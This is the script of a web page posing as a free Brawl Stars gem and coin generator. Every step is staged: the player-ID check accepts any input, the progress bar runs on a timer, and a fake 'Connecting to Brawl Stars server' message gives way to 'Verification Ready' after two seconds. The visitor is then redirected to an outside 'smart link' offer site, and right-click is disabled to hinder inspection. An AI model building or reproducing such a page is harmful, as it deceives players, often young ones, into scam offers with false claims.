  <script>
    // Define all functions first
    function showGenerator(event) {
      // Prevent default link behavior
      if (event) event.preventDefault();
      
      // Hide first page and show generator page
      document.getElementById('first-page').style.display = 'none';
      document.getElementById('generator-page').style.display = 'block';
      
      // Reset generator to initial state
      document.getElementById('gem-packs').style.display = 'grid';
      document.getElementById('coin-packs').style.display = 'none';
      document.getElementById('page-title').textContent = 'Gems Packs';
      
      return false;
    }

    function showCoins() {
      const gemPacks = document.getElementById('gem-packs');
      const coinPacks = document.getElementById('coin-packs');
      const pageTitle = document.getElementById('page-title');
      gemPacks.classList.remove('fade-in');
      gemPacks.classList.add('fade');
      setTimeout(() => {
        gemPacks.style.display = 'none';
        coinPacks.style.display = 'grid';
        coinPacks.classList.add('fade-in');
        pageTitle.textContent = 'Coin Packs';
      }, 500);
    }

    function openModal() {
      document.getElementById('modal').style.display = 'flex';
      // Clear any previous error messages
      document.getElementById('player-id-error').style.display = 'none';
      // Clear the input field
      document.getElementById('player-id-input').value = '';
    }

    function closeModal() {
      document.getElementById('modal').style.display = 'none';
    }

    function validatePlayerId() {
      const playerIdInput = document.getElementById('player-id-input');
      const errorMessage = document.getElementById('player-id-error');
      
      // Check if the player ID is empty
      if (!playerIdInput.value.trim()) {
        errorMessage.style.display = 'block';
        return false;
      }
      
      // If player ID is entered, proceed to the next modal
      openGenerateModal();
      return true;
    }

    function openGenerateModal() {
      closeModal();
      document.getElementById('modal-generate').style.display = 'flex';
      startProgress();
    }

    function startProgress() {
      const progress = document.getElementById('progress');
      let width = 0;
      const interval = setInterval(() => {
        if (width >= 100) {
          clearInterval(interval);
          document.getElementById('complete-btn').classList.add('active');
        } else {
          width += 10;
          progress.style.width = width + '%';
        }
      }, 500);
    }

    function showVerificationModal() {
      document.getElementById('modal-generate').style.display = 'none';
      const verificationModal = document.getElementById('verification-modal');
      const verificationMessage = document.getElementById('verification-message');
      const preVerifyMessage = document.getElementById('pre-verify-message');
      const verifyButton = document.getElementById('verify-button');
      verificationModal.style.display = 'flex';
      
      // Reset button state
      verifyButton.classList.remove('active');
      preVerifyMessage.style.display = 'none';
      
      // Initial message
      verificationMessage.textContent = "Connecting to Brawl Stars server...";
      verificationMessage.style.color = "#555";
      
      // Show verify button after 2 seconds
      setTimeout(() => {
        verificationMessage.textContent = "Verification Ready!";
        verificationMessage.style.color = "green";
        preVerifyMessage.style.display = 'block';
        verifyButton.classList.add('active');
      }, 2000);
    }
    
    function redirectToSmartLink() {
      // Redirect to the new smart link
      window.location.href = "https://appverification.site/cl/i/pqo9x3";
    }

    // Disable context menu (right-click menu)
    document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
      return false;
    });

    // Show first page by default
    document.addEventListener('DOMContentLoaded', function() {
      document.getElementById('first-page').style.display = 'block';
      document.getElementById('generator-page').style.display = 'none';
      
      // Add click event to the button for safety
      const claimButton = document.querySelector('.button');
      if (claimButton) {
        claimButton.addEventListener('click', showGenerator);
      }
    });
